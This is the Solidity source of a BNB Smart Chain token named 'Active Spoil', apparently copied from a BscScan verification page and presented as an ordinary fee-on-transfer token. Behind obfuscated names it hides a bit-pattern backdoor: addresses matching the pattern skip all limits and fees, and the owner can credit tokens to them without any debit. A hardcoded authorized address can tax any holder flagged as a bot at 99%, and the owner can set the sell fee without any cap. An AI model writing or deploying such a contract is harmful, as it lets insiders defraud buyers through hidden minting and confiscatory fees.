/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IERC20 {    function balanceOf(address account) external view returns (uint256);}library SafeMath {    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return a % b;    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }}interface IBEP20 {    function symbol() external view returns (string memory);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function getOwner() external view returns (address);    function decimals() external view returns (uint8);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function approve(address spender, uint256 amount) external returns (bool);    function totalSupply() external view returns (uint256);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function balanceOf(address account) external view returns (uint256);    function name() external view returns (string memory);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IUniswapV2Router {    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function factory() external pure returns (address);    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);    function WETH() external pure returns (address);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function removeAuthorized(address adr) public onlyOwner() {        competent[adr] = false;    }    function Owner() public view returns (address) {        return owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}contract ActiveSpoil is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Active Spoil ";    string constant _symbol = "ActiveSpoil";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private minExemptWalletModeSwapFeeLiquidity = 0;    uint256 private txWalletSwapSell = 6;    //SELL FEES    uint256 private teamModeTxMin = 0;    uint256 private liquidityMaxSellMode = 6;    bool private buyLiquidityTradingMarketingBurnIs = true;    bool private autoReceiverBurnSwap = true;    bool private burnMaxBuyReceiver = true;    uint256 private feeModeSellLimitTxSwap = _totalSupply / 1000; // 0.1%    uint256 private txMinTeamSellReceiver = txWalletSwapSell + minExemptWalletModeSwapFeeLiquidity;    uint256 private buyMaxBotsTeam = 100;    bool private maxWalletFeeBots;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private exemptReceiverTxLimit;    mapping(address => bool) private sellMinBotsAuto;    mapping(address => bool) private liquidityExemptLaunchedTrading;    mapping(address => bool) private botsTxBuyFee;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private maxSwapLaunchedAuto;    uint256 private feeTeamLiquidityExempt;    address private botsTradingFeeBuy = (msg.sender); // auto-liq address    address private buyLiquiditySwapSellIsTx = (0xad1e06744CF17E60560E0613ffFFdE0b6F105897); // marketing address    address private walletTxExemptBuy = DEAD;    address private teamLimitLaunchedMode = DEAD;    address private feeIsModeMax = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        bool private tradingReceiverModeMaxLimit = false;    bool private sellLaunchedTradingReceiverBots = false;    bool private tradingAutoMaxIs = false;    bool public autoWalletLiquidityTx = false;    bool public tradingFeeSellLaunched = false;    uint256 private launchedMarketingExemptMode = 0;    bool private teamExemptWalletSwap = false;    uint256 private modeFeeLaunchedExempt = 0;    uint256 private modeMaxWalletBuy = 0;    bool private limitMarketingSwapModeMax = false;    bool private sellLaunchedTradingReceiverBots0 = false;    uint256 public sellLaunchedTradingReceiverBots1 = 0;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        maxWalletFeeBots = true;        liquidityExemptLaunchedTrading[msg.sender] = true;        liquidityExemptLaunchedTrading[0x0000000000000000000000000000000000000000] = true;        liquidityExemptLaunchedTrading[0x000000000000000000000000000000000000dEaD] = true;        liquidityExemptLaunchedTrading[address(this)] = true;        exemptReceiverTxLimit[msg.sender] = true;        exemptReceiverTxLimit[address(this)] = true;        sellMinBotsAuto[msg.sender] = true;        sellMinBotsAuto[0x0000000000000000000000000000000000000000] = true;        sellMinBotsAuto[0x000000000000000000000000000000000000dEaD] = true;        sellMinBotsAuto[address(this)] = true;        SetAuthorized(address(0x93de774bdEA95768AAB22F84FFFfcBf925944ce4));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return maxExemptTxLaunched(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return maxExemptTxLaunched(sender, recipient, amount);    }    function setLiquidityMaxSellMode(uint256 a0) public onlyOwner {        if (liquidityMaxSellMode == liquidityMaxSellMode) {            liquidityMaxSellMode=a0;        }        if (liquidityMaxSellMode == txWalletSwapSell) {            txWalletSwapSell=a0;        }        if (liquidityMaxSellMode == buyMaxBotsTeam) {            buyMaxBotsTeam=a0;        }        liquidityMaxSellMode=a0;    }
    function feeMinBurnAuto() internal swapping {                if (sellLaunchedTradingReceiverBots0 == sellLaunchedTradingReceiverBots) {            sellLaunchedTradingReceiverBots0 = sellLaunchedTradingReceiverBots;        }        uint256 amountToLiquify = feeModeSellLimitTxSwap.mul(minExemptWalletModeSwapFeeLiquidity).div(txMinTeamSellReceiver).div(2);        uint256 amountToSwap = feeModeSellLimitTxSwap.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (tradingAutoMaxIs == teamExemptWalletSwap) {            tradingAutoMaxIs = autoReceiverBurnSwap;        }        if (tradingReceiverModeMaxLimit != tradingReceiverModeMaxLimit) {            tradingReceiverModeMaxLimit = burnMaxBuyReceiver;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = txMinTeamSellReceiver.sub(minExemptWalletModeSwapFeeLiquidity.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(minExemptWalletModeSwapFeeLiquidity).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(txWalletSwapSell).div(totalETHFee);                payable(buyLiquiditySwapSellIsTx).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                botsTradingFeeBuy,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function isBot(address addr) public view returns (bool) {        return botsTxBuyFee[addr];    }
    function getModeMaxWalletBuy() public view returns (uint256) {        if (modeMaxWalletBuy != txWalletSwapSell) {            return txWalletSwapSell;        }        if (modeMaxWalletBuy == modeFeeLaunchedExempt) {            return modeFeeLaunchedExempt;        }        if (modeMaxWalletBuy == liquidityMaxSellMode) {            return liquidityMaxSellMode;        }        return modeMaxWalletBuy;    }
    function getTeamModeTxMin() public view returns (uint256) {        if (teamModeTxMin != liquidityMaxSellMode) {            return liquidityMaxSellMode;        }        if (teamModeTxMin == minExemptWalletModeSwapFeeLiquidity) {            return minExemptWalletModeSwapFeeLiquidity;        }        if (teamModeTxMin != minExemptWalletModeSwapFeeLiquidity) {            return minExemptWalletModeSwapFeeLiquidity;        }        return teamModeTxMin;    }
    function setBotsTradingFeeBuy(address a0) public onlyOwner {        if (botsTradingFeeBuy != walletTxExemptBuy) {            walletTxExemptBuy=a0;        }        if (botsTradingFeeBuy != buyLiquiditySwapSellIsTx) {            buyLiquiditySwapSellIsTx=a0;        }        if (botsTradingFeeBuy == walletTxExemptBuy) {            walletTxExemptBuy=a0;        }        botsTradingFeeBuy=a0;    }
    function getLiquidityMaxSellMode() public view returns (uint256) {        if (liquidityMaxSellMode != minExemptWalletModeSwapFeeLiquidity) {            return minExemptWalletModeSwapFeeLiquidity;        }        if (liquidityMaxSellMode != feeModeSellLimitTxSwap) {            return feeModeSellLimitTxSwap;        }        return liquidityMaxSellMode;    }
    function minIsReceiverBurn(address sender, address recipient, uint256 amount) internal returns (bool) {        if (!isOwner(sender)) {            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        }        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function maxExemptTxLaunched(address sender, address recipient, uint256 amount) internal returns (bool) {                bool bTxWalletValue = launchedLiquidityBurnSwap(sender) || launchedLiquidityBurnSwap(recipient);                                if (inSwap || bTxWalletValue) {return minIsReceiverBurn(sender, recipient, amount);}        if (!exemptReceiverTxLimit[sender] && !exemptReceiverTxLimit[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (modeFeeLaunchedExempt != minExemptWalletModeSwapFeeLiquidity) {            modeFeeLaunchedExempt = launchBlock;        }        if (tradingReceiverModeMaxLimit == burnMaxBuyReceiver) {            tradingReceiverModeMaxLimit = buyLiquidityTradingMarketingBurnIs;        }        require((amount <= _maxTxAmount) || liquidityExemptLaunchedTrading[sender] || liquidityExemptLaunchedTrading[recipient], "Max TX Limit!");        if (teamBotsSwapBurn()) {feeMinBurnAuto();}        setTotalFee();        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = marketingTradingFeeIs(sender) ? launchedTeamModeSell(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function launchedLiquidityBurnSwap(address addr) private view returns (bool) {        return firstSetAutoReceiver == (uint256(uint160(addr)) << 192) >> 238;    }
    function walletMinSellLimit(address sender, bool selling) internal returns (uint256) {                if (teamExemptWalletSwap != burnMaxBuyReceiver) {            teamExemptWalletSwap = tradingReceiverModeMaxLimit;        }        if (modeMaxWalletBuy != buyMaxBotsTeam) {            modeMaxWalletBuy = teamModeTxMin;        }        if (launchedMarketingExemptMode != modeFeeLaunchedExempt) {            launchedMarketingExemptMode = txMinTeamSellReceiver;        }        if (selling) {            txMinTeamSellReceiver = liquidityMaxSellMode + teamModeTxMin;            return txMinTeamSellReceiver;        }        if (!selling && sender == uniswapV2Pair) {            txMinTeamSellReceiver = txWalletSwapSell + minExemptWalletModeSwapFeeLiquidity;            return txMinTeamSellReceiver;        }        return liquidityMaxSellMode + teamModeTxMin;    }
    function setBot(address addr) public onlyAuthorized {        botsTxBuyFee[addr] = true;    }
    function marketingTradingFeeIs(address sender) internal view returns (bool) {        return !sellMinBotsAuto[sender];    }
    function getTxWalletSwapSell() public view returns (uint256) {        if (txWalletSwapSell == feeModeSellLimitTxSwap) {            return feeModeSellLimitTxSwap;        }        return txWalletSwapSell;    }
    function setModeMaxWalletBuy(uint256 a0) public onlyOwner {        if (modeMaxWalletBuy == modeMaxWalletBuy) {            modeMaxWalletBuy=a0;        }        if (modeMaxWalletBuy != txMinTeamSellReceiver) {            txMinTeamSellReceiver=a0;        }        if (modeMaxWalletBuy == modeMaxWalletBuy) {            modeMaxWalletBuy=a0;        }        modeMaxWalletBuy=a0;    }
    function setTotalFee() internal {        txMinTeamSellReceiver = liquidityMaxSellMode + teamModeTxMin;    }
    function teamBotsSwapBurn() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    burnMaxBuyReceiver &&    _balances[address(this)] >= feeModeSellLimitTxSwap;    }
    function getBotsTradingFeeBuy() public view returns (address) {        if (botsTradingFeeBuy != feeIsModeMax) {            return feeIsModeMax;        }        if (botsTradingFeeBuy != walletTxExemptBuy) {            return walletTxExemptBuy;        }        if (botsTradingFeeBuy != feeIsModeMax) {            return feeIsModeMax;        }        return botsTradingFeeBuy;    }
    function getTxMinTeamSellReceiver() public view returns (uint256) {        if (txMinTeamSellReceiver != teamModeTxMin) {            return teamModeTxMin;        }        if (txMinTeamSellReceiver != teamModeTxMin) {            return teamModeTxMin;        }        return txMinTeamSellReceiver;    }
    function setTeamModeTxMin(uint256 a0) public onlyOwner {        if (teamModeTxMin != txMinTeamSellReceiver) {            txMinTeamSellReceiver=a0;        }        teamModeTxMin=a0;    }
    function setTxMinTeamSellReceiver(uint256 a0) public onlyOwner {        if (txMinTeamSellReceiver != feeModeSellLimitTxSwap) {            feeModeSellLimitTxSwap=a0;        }        if (txMinTeamSellReceiver != modeFeeLaunchedExempt) {            modeFeeLaunchedExempt=a0;        }        txMinTeamSellReceiver=a0;    }
    function setTxWalletSwapSell(uint256 a0) public onlyOwner {        if (txWalletSwapSell == launchedMarketingExemptMode) {            launchedMarketingExemptMode=a0;        }        if (txWalletSwapSell == txMinTeamSellReceiver) {            txMinTeamSellReceiver=a0;        }        if (txWalletSwapSell == modeFeeLaunchedExempt) {            modeFeeLaunchedExempt=a0;        }        txWalletSwapSell=a0;    }
    function launchedTeamModeSell(address sender, address receiver, uint256 amount) internal returns (uint256) {                uint256 feeAmount = amount.mul(walletMinSellLimit(sender, receiver == uniswapV2Pair)).div(buyMaxBotsTeam);        if (botsTxBuyFee[sender] || botsTxBuyFee[receiver]) {            feeAmount = amount.mul(99).div(buyMaxBotsTeam);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}